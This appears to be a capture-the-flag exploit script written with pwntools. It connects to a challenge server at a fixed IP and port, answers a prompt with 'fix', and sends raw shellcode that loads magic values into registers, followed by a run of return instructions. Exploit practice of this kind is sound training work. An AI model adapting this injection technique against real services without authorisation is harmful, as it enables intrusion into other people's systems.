from pwn import *

# Remote connection details
host = "94.237.50.250"
port = 54813

# Payload to send after 'ts: '
payload = b'\x49\xc7\xc0\xde\xc0\x37\x13\x49\xb9\xef\xbe\xad\xde\x00\x00\x00\x00\x49\xba\x37\x13\xad\xde\x00\x00\x00\x00\x49\xc7\xc4\xfe\xca\x37\x13\x49\xbd\xde\xc0\xef\xbe\x00\x00\x00\x00\x49\xc7\xc6\x37\x13\x37\x13\x49\xc7\xc7\xad\xde\x37\x13' + b'\xc3' * 25

# Connect to the remote host
conn = remote(host, port)

# Wait for 'x": ' and send "fix"
output = conn.recvuntil(b'x": ')
print(output.decode())
conn.sendline(b'fix')

# Wait for 'ts: ' and send the payload
output = conn.recvuntil(b'ts: ')
print(output.decode())
conn.send(payload)

output = conn.recv()
print(output.decode())
